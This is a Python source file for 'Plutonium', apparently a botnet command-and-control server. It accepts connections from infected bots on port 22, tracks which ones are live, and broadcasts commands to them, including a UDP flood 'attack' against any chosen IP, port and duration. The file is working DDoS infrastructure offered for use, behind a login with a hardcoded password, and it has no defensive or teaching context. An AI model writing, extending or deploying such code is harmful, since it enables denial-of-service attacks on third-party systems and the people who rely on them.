from threading import Thread
from time import sleep
import ctypes, socket, sys, os
import platform, signal
from random import choice
from typing import Union, Tuple
from colorama import Fore, init

os.system("cls & title Login to Plutonium 238")
user=input("Username : ")
pasw=input("Password : ")
if user == 'root':
	if pasw!='vtgiang2010':
		print("Error! Permission Denied")
		sys.exit(0)
else:
	print("Error! Permission Denied")
	sys.exit(0)
os.system("cls & title Login to Plutonium 238")
for i in range(9):
	print("Loading Server [•]")
	sleep(0.1)
	os.system('cls')
	print("Loading Server [••]")
	sleep(0.1)
	os.system('cls')
	print("Loading Server [•••]")
	sleep(0.1)
	os.system('cls')
os.system("Plutonium 238")
class Colours:
	def __init__(self): 
		if platform.system() == 'Windows':
			kernel32 = ctypes.windll.kernel32
			kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
		COMMANDS = {
			# Lables
			'info': (33, '[!] '),
			'que': (34, '[?] '),
			'bad': (31, '[-] '),
			'good': (32, '[+] '),
			'run': (97, '[~] '),
			# Colors
			'green': 32,
			'lgreen': 92,
			'lightgreen': 92,
			'grey': 37,
			'black': 30,
			'red': 31,
			'lred': 91,
			'lightred': 91,
			'cyan': 36,
			'lcyan': 96,
			'lightcyan': 96,
			'blue': 34,
			'lblue': 94,
			'lightblue': 94,
			'purple': 35,
			'yellow': 93,
			'white': 97,
			'lpurple': 95,
			'lightpurple': 95,
			'orange': 33,
			# Styles
			'bg': ';7',
			'bold': ';1',
			'italic': '3',
			'under': '4',
			'strike': '09',
		}
		for key, val in COMMANDS.items():
			value = val[0] if isinstance(val, tuple) else val
			prefix = val[1] if isinstance(val, tuple) else ''
			locals()[key] = lambda s, prefix=prefix, key=value: _gen(s, prefix, key)
			self.__dict__[key] = lambda s, prefix=prefix, key=value: self._gen(s, prefix, key)
	def _gen(self,string, prefix, key):
		colored = prefix if prefix else string
		not_colored = string if prefix else ''
		result = '\033[{}m{}\033[0m{}'.format(key, colored, not_colored)
		return result
class Server(Colours):
	co=["green","lgreen","lightgreen","grey","red","lred","lightred","cyan","lcyan","lightcyan","blue","lblue","lightblue","purple","yellow","white","lpurple","lightpurple","orange"]
	def __init__(self, connect:Tuple[str,int]=("0.0.0.0",22)):
		super().__init__()
		signal.signal(signal.SIGINT, self.exit_gracefully)
		signal.signal(signal.SIGTERM, self.exit_gracefully)
		self.print_logo()
		self.all_connections = []
		self.all_address = []
		self.stop = False
		if self._bind(connect):
			while True:
				self._take_cmd()
	def exit_gracefully(self,signum:Union[str,object]="", frame:Union[str,object]=""):
		print("\nExiting....")
		self.stop = True
		self.sock.close()
		sleep(1)
		sys.exit(0)
	def _bind(self, connect:Tuple[str,int]) -> bool:
		self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.sock.bind(connect)
		self.sock.listen(50)
		self.sock.settimeout(0.5)
		Thread(target=self.collect).start()
		Thread(target=self.check).start()
		return True
	def print_logo(self) -> None:
		os.system('cls')
		print("""
| Plutonium | New Desing, Enjoy! | Discord [HaRmX96 @ 8916]
            ╔═╗╦  ╦ ╦═╦═╔═╗╔═╗╦╦ ╦╔╦╗
            ╠═╝║  ║ ║ ║ ║ ║║ ║║║ ║║║║
            ╩  ╩═╝╚═╝ ╩ ╚═╝╩ ╩╩╚═╝╩ ╩
         ══╦════════════════════════╦══
   ╔═══════╩════════════════════════╩═══════╗
   ║    Welcome To Plutonium CnC Server !   ║
   ║   Dev : HaRmX96 @ github.com/HaRmX96   ║
 ╔╗╚════════════════════════════════════════╝╔╗
 ║╚══════════════════════════════════════════╝║
╔╩════════════════════════════════════════════╩╗
║        Type "help" to see the command        ║
║Copyrigtht © Superior 2022 All Rights Reserved║
╚══════════════════════════════════════════════╝
		""")	
	def _print_help(self) -> None:
		os.system('cls')
		print("""
| Plutonium | New Desing, Enjoy! | Discord [HaRmX96 @ 8916]

                            ╦ ╦╔═╗╦  ╔═╗
                            ╠═╣║╣ ║  ╠═╝
                            ╩ ╩╚═╝╩═╝╩
            ╔═════════════════════════════════════════╗
            ║  attack udp [ip] [port] [time] [thread] ║
            ╚═════════════════════════════════════════╝
╔═══════════════════════════════╗ ╔═══════════════════════════════╗
║ ping   → Check server         ║ ║ kill   → To stop all servers  ║
╚═══════════════════════════════╝ ╚═══════════════════════════════╝
╔═══════════════════════════════╗ ╔═══════════════════════════════╗
║ home   → Start screen         ║ ║ ls     → Show online server   ║
╚═══════════════════════════════╝ ╚═══════════════════════════════╝
╔═══════════════════════════════╗ ╔═══════════════════════════════╗
║ exit   → For exiting          ║ ║ update → Update the clients   ║
╚═══════════════════════════════╝ ╚═══════════════════════════════╝
		""")
	def print_home(self) -> None:
		os.system('cls')
		print("""
| Plutonium | New Desing, Enjoy! | Discord [HaRmX96 @ 8916]

                ╔═╗╦  ╦ ╦═╦═╔═╗╔═╗╦╦ ╦╔╦╗
                ╠═╝║  ║ ║ ║ ║ ║║ ║║║ ║║║║
                ╩  ╩═╝╚═╝ ╩ ╚═╝╩ ╩╩╚═╝╩ ╩
              ══╦════════════════════════╦══
        ╔═══════╩════════════════════════╩═══════╗
        ║    Welcome To Plutonium CnC Server !   ║
        ║   Dev : HaRmX96 @ github.com/HaRmX96   ║
      ╔╗╚════════════════════════════════════════╝╔╗
      ║╚══════════════════════════════════════════╝║
     ╔╩════════════════════════════════════════════╩╗
     ║        Type "help" to see the command        ║
     ║Copyrigtht © Superior 2022 All Rights Reserved║
     ╚══════════════════════════════════════════════╝
		""")
	def collect(self):
		while not self.stop:
			try:
				conn, address = self.sock.accept()
				self.all_connections.append(conn)
				self.all_address.append(address)
			except socket.timeout:
				continue
			except socket.error:
				continue
			except Exception as e:
				print("Error accepting connections")
	def _take_cmd(self):
		cmd=input("""Root₪Plutonium $ —→ """).strip()
		if cmd:
			if cmd == "ls":
				results = ''
				for i, (ip, port) in enumerate(self.all_address):
					results = results+self.__dict__[choice(self.co)](f'{[i]}    {ip}:{port}    ONLINE\n')
				print("-----Bot-----" + "\n" + results)
			elif cmd == "help":
				self._print_help()
			elif cmd == "update":
				self.check(display=True,always=False)
			elif cmd == "home":
				self.print_home()
			elif cmd in ["exit","quit"]:
				self.exit_gracefully()
			elif "attack" in cmd:
				for i, (ip, port) in enumerate(self.all_address):
					try:
						self.all_connections[i].send(cmd.encode())
						print(self.__dict__[choice(self.co)](f'[+]    {ip}:{port}    {self.all_connections[i].recv(1024*5).decode("ascii")}'))
					except BrokenPipeError:
						del self.all_address[i]
						del self.all_connections[i]
			elif cmd == "ping" or "kill":
				for i, (ip, port) in enumerate(self.all_address):
					try:
						self.all_connections[i].send(cmd.encode())
						print(self.__dict__[choice(self.co)](f'[+]    {ip}:{port}    {self.all_connections[i].recv(1024*5).decode("ascii")}'))
					except BrokenPipeError:
						del self.all_address[i]
						del self.all_connections[i]
	def check(self, display:bool=False, always:bool=True):
		while not self.stop:
			c=0
			for n,tcp in zip(self.all_address,self.all_connections):
				c+=1
				try:
					tcp.send(str.encode("ping"))
					if tcp.recv(1024).decode("utf-8") and display:
							print(self.__dict__[choice(self.co)](f'[+]    {str(n[0])+":"+str(n[1])}    LIVE'))
				except:
					if display:
						print(self.__dict__[choice(self.co)](f'[+]    {str(n[0])+":"+str(n[1])}    DEAD'))
					del self.all_address[c-1]
					del self.all_connections[c-1]
					continue
			if not always:
				break
			
			sleep(0.5)

if __name__ == '__main__':
	Server()
